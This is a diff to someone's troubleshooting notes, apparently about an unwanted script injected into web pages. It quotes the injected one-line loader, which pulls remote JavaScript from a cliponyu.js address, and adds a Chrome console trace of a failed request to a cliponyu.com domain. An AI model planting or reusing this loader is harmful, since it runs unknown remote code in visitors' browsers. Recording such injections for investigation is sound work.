@@ -68,6 +68,7 @@ toLocaleString: function()
 toString: function()
 valueOf: function()
 
+-via canary:
 -script to be runned:
 <script>
     with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://img.baidu.com/hunter/cliponyu.js?st='+~(new Date()/864e5)];
@@ -176,6 +177,26 @@ EventImpl.dispatch @ VM393 extensions::event_bindings:409
 publicClassPrototype.(anonymous function) @ VM399 extensions::utils:138
 dispatchOnMessage @ VM400 extensions::messaging:392
 20:09:04.593 
+
+tag_assistant_compiled.js:117 GET https://static01.cliponyu.com/static/common/pkg/commonpublic_2aa4d1c.js net::ERR_CERT_COMMON_NAME_INVALID
+ig @ tag_assistant_compiled.js:117
+(anonymous) @ tag_assistant_compiled.js:118
+Ia @ tag_assistant_compiled.js:10
+eg.Ma @ tag_assistant_compiled.js:118
+hm @ tag_assistant_compiled.js:334
+EventImpl.dispatchToListener @ VM313 extensions::event_bindings:403
+publicClassPrototype.(anonymous function) @ VM319 extensions::utils:138
+EventImpl.dispatch_ @ VM313 extensions::event_bindings:387
+EventImpl.dispatch @ VM313 extensions::event_bindings:409
+publicClassPrototype.(anonymous function) @ VM319 extensions::utils:138
+messageListener @ VM328 extensions::messaging:240
+EventImpl.dispatchToListener @ VM313 extensions::event_bindings:403
+publicClassPrototype.(anonymous function) @ VM319 extensions::utils:138
+EventImpl.dispatch_ @ VM313 extensions::event_bindings:387
+EventImpl.dispatch @ VM313 extensions::event_bindings:409
+publicClassPrototype.(anonymous function) @ VM319 extensions::utils:138
+dispatchOnMessage @ VM328 extensions::messaging:392
+19:09:37.685 
 
 -via windows edge:
 
